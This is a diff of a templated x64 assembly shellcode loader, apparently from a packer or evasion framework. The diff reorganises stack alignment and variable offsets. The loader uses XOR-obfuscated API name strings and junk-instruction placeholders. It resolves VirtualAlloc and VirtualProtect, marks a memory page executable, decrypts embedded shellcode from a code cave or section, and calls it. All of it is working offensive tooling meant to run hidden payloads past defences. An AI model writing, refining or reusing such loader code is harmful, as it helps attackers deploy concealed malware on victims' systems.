@@ -4,27 +4,34 @@
 // rsi store address of kernel32.dll
 // rbx store address of LoadLibrary
 // rbp store address of GetProcAddress
-// [rsp+16] store address of VirtualAlloc
-// [rsp+24] store address of VirtualFree
-// [rsp+32] store address of VirtualProtect
-// [rsp+40] store address of CreateThread
-// [rsp+48] store address of WaitForSingleObject
+// [rsp+0x08] store address of allocated memory page
+// [rsp+0x10] store address of VirtualAlloc
+// [rsp+0x18] store address of VirtualFree
+// [rsp+0x20] store address of VirtualProtect
+// [rsp+0x28] store address of CreateThread
+// [rsp+0x30] store address of WaitForSingleObject
 
 entry:
+  // ensure stack is 16 bytes aligned
+  push rbp
+  mov rbp, rsp
+  and rsp, 0xFFFFFFFFFFFFFFF0
+  push rbp
+
   // reserve stack for store variables
-  sub rsp, 56
+  sub rsp, 0x48
 
 // get necessary procedure address
 {{if .LackProcedure}}
   // push kernel32 module name to stack
-  mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}                {{igi}}
-  mov {{.Reg.r8}},  {{index .Kernel32DLLKey 0}}               {{igi}}
-  xor {{.Reg.rax}}, {{.Reg.r8}}                               {{igi}}
-  push {{.Reg.rax}}                                           {{igi}}
-  mov {{.Reg.rbx}}, {{index .Kernel32DLLDB 1}}                {{igi}}
-  mov {{.Reg.r9}},  {{index .Kernel32DLLKey 1}}               {{igi}}
-  xor {{.Reg.rbx}}, {{.Reg.r9}}                               {{igi}}
-  push {{.Reg.rbx}}                                           {{igi}}
+  mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}                 {{igi}}
+  mov {{.Reg.r8}},  {{index .Kernel32DLLKey 0}}                {{igi}}
+  xor {{.Reg.rax}}, {{.Reg.r8}}                                {{igi}}
+  push {{.Reg.rax}}                                            {{igi}}
+  mov {{.Reg.rbx}}, {{index .Kernel32DLLDB 1}}                 {{igi}}
+  mov {{.Reg.r9}},  {{index .Kernel32DLLKey 1}}                {{igi}}
+  xor {{.Reg.rbx}}, {{.Reg.r9}}                                {{igi}}
+  push {{.Reg.rbx}}                                            {{igi}}
 
   {{if .LoadLibraryWOnly}}
     mov {{.Reg.rcx}}, {{index .Kernel32DLLDB 2}}
@@ -87,14 +94,15 @@ entry:
     sub rsp, 0x20
     call {{.RegN.rbp}}
     add rsp, 0x20
-    mov [rsp+16], rax
     // restore stack for procedure name
     add rsp, 2*8
+    // store procedure address to stack
+    mov [rsp+0x10], rax
   {{else}}
     mov {{.RegV.rcx}}, {{.RegN.rdi}}
     add {{.RegV.rcx}}, {{hex .VirtualAlloc}}
     mov {{.RegV.rcx}}, [{{.RegV.rcx}}]
-    mov [rsp+16], {{.RegV.rcx}}
+    mov [rsp+0x10], {{.RegV.rcx}}
   {{end}}
 
   // get procedure address of VirtualProtect
@@ -114,13 +122,15 @@ entry:
     sub rsp, 0x20
     call {{.RegN.rbp}}
     add rsp, 0x20
-    mov {{.RegN.r14}}, rax
     // restore stack for procedure name
     add rsp, 2*8
+    // store procedure address to stack
+    mov [rsp+0x20], rax
   {{else}}
     mov {{.RegV.rdx}}, {{.RegN.rdi}}
     add {{.RegV.rdx}}, {{hex .VirtualProtect}}
-    mov {{.RegN.r14}}, [{{.RegV.rdx}}]
+    mov {{.RegV.rdx}}, [{{.RegV.rdx}}]
+    mov [rsp+0x20], {{.RegV.rdx}}
   {{end}}
 
   // get procedure address of CreateThread
@@ -162,11 +172,12 @@ entry:
   mov {{.RegV.rcx}}, {{.RegN.rdi}}
   add {{.RegV.rcx}}, {{hex .VirtualAlloc}}
   mov {{.RegV.rcx}}, [{{.RegV.rcx}}]
-  mov [rsp+16], {{.RegV.rcx}}
+  mov [rsp+0x10], {{.RegV.rcx}}
   // get procedure address of VirtualProtect
   mov {{.RegV.rdx}}, {{.RegN.rdi}}
   add {{.RegV.rdx}}, {{hex .VirtualProtect}}
-  mov {{.RegN.r14}}, [{{.RegV.rdx}}]
+  mov {{.RegV.rdx}}, [{{.RegV.rdx}}]
+  mov [rsp+0x20], {{.RegV.rdx}}
   // get procedure address of CreateThread
   {{if .NeedCreateThread}}
     mov {{.RegV.r8}}, {{.RegN.rdi}}
@@ -176,19 +187,17 @@ entry:
 {{end}} // LackProcedure
 
   // allocate memory for shellcode
-  mov {{.RegV.rax}}, [rsp+16]
+  mov rax, [rsp+0x10]
   xor rcx, rcx
   mov rdx, {{hex .MemRegionSize}}
   mov r8, 0x3000  // MEM_RESERVE|MEM_COMMIT
   mov r9, 0x04    // PAGE_READWRITE
   sub rsp, 0x20
-  call {{.RegV.rax}}
+  call rax
   add rsp, 0x20
 
   // store allocated memory address
-  // and ensure stack is 16 bytes aligned
-  sub rsp, 0x10
-  mov [rsp], rax
+  mov [rsp+0x08], rax
 
   // padding garbage data to page
   mov {{.RegV.rdx}}, rax
@@ -213,13 +222,14 @@ entry:
   jnz loop_padding
 
   // adjust memory region protect
+  mov rax, [rsp+0x20]
+  mov rcx, [rsp+0x08]
   sub rsp, 0x10 // for store old protect
-  mov rcx, [rsp + 0x10]
   mov rdx, {{hex .MemRegionSize}}
   mov r8, 0x40 // PAGE_EXECUTE_READWRITE
   mov r9, rsp
   sub rsp, 0x20
-  call {{.RegN.r14}}
+  call rax
   add rsp, 0x20
   add rsp, 0x10 // restore stack
 
@@ -227,7 +237,7 @@ entry:
 {{if .CodeCave}}
   // extract encrypted shellcode from code cave
   mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
-  mov {{.RegN.rdi}}, [rsp]
+  mov {{.RegN.rdi}}, [rsp+0x08]
   add {{.RegN.rdi}}, {{hex .EntryOffset}}
   {{STUB CodeCaveMode STUB}}
 {{end}} // CodeCave
@@ -240,7 +250,7 @@ entry:
   // extract encrypted shellcode from section
   mov rsi, {{.RegN.rdi}}
   add rsi, {{hex .ShellcodeOffset}}
-  mov rdi, [rsp + 0x10]
+  mov rdi, [rsp+0x18]
   add rdi, {{hex .EntryOffset}}
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
  loop_extract:
@@ -256,7 +266,7 @@ entry:
 
   // decrypt shellcode in the memory page
   mov {{.RegV.rax}}, {{hex .ShellcodeKey}}
-  mov {{.RegV.rdx}}, [rsp]
+  mov {{.RegV.rdx}}, [rsp+0x08]
   add {{.RegV.rdx}}, {{hex .EntryOffset}}
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
  loop_decrypt:
@@ -272,11 +282,8 @@ entry:
 {{end}} // SectionMode
 
   // get the shellcode entry point
-  mov {{.RegV.rax}}, [rsp]
+  mov {{.RegV.rax}}, [rsp+0x08]
   add {{.RegV.rax}}, {{hex .EntryOffset}}
-
-  // restore stack about allocated memory address
-  add rsp, 0x10
 
   // call the shellcode
   sub rsp, 0x20
@@ -284,7 +291,12 @@ entry:
   add rsp, 0x20
 
   // restore stack for store variables
-  add rsp, 56
+  add rsp, 0x48
+
+  // restore stack and rbp
+  pop rbp                                                      {{igi}}
+  mov rsp, rbp                                                 {{igi}}
+  pop rbp                                                      {{igi}}
 
   // mark the end of loader
   {{db .EndOfLoader}}
